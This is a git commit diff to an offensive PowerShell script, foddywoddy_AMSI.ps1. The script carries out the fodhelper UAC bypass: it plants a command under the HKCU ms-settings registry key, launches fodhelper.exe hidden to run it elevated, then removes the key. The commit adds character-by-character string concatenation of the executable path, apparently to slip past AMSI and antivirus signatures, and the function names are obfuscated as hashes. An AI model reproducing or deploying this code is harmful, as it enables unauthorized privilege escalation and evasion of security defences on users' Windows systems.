870279cf3006d69a827dddd11c23dc106814bec4
p4yl0ad <57832389+p4yl0ad@users.noreply.github.com>
2021-04-06 15:49:36 +0100

    Update foddywoddy_AMSI.ps1

--- UAC/foddywoddy_AMSI.ps1
+++ UAC/foddywoddy_AMSI.ps1
@@ -5,11 +5,14 @@ function b1946ac92492d2347c6235b4d2611184 {
     New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
     New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
     Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $cmd -Force
-    c4ff45bb1fab99f9164b7fec14b2292a
+	c4ff45bb1fab99f9164b7fec14b2292a
 }
+
 function c4ff45bb1fab99f9164b7fec14b2292a {
-    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
-    Start-Sleep -s 3
+	$valid = "C"+":"+"\"+"W"+"i"+"n"+"d"+"o"+"w"+"s"+"\"+"S"+"y"+"s"+"t"+"e"+"m"+"3"+"2"+"\"+"f"+"o"+"d"+"h"+"e"+"l"+"p"+"e"+"r"+"."+"e"+"x"+"e"
+    Start-Process $valid -WindowStyle Hidden
+	Start-Sleep -s 3
     Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force -ErrorAction SilentlyContinue
 }
+
 b1946ac92492d2347c6235b4d2611184
